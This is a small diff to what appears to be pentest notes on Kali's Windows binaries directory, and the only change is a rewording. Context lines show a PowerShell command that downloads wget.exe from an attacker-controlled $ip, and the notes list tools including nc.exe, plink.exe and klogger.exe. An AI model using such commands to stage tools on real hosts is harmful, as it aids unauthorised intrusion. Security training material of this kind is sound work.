@@ -7,7 +7,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$ip/wget.e
 By default Kali comes with the  windows-resources directory:
 
 ## Binaries Directory
-Notable being nc.exe, plink.exe, radmin.exe and wget.exe
+Notables like nc.exe, plink.exe, radmin.exe and wget.exe
 ```bash
 /usr/share/windows-resources/binaries/klogger.exe
 /usr/share/windows-resources/binaries/nc.exe
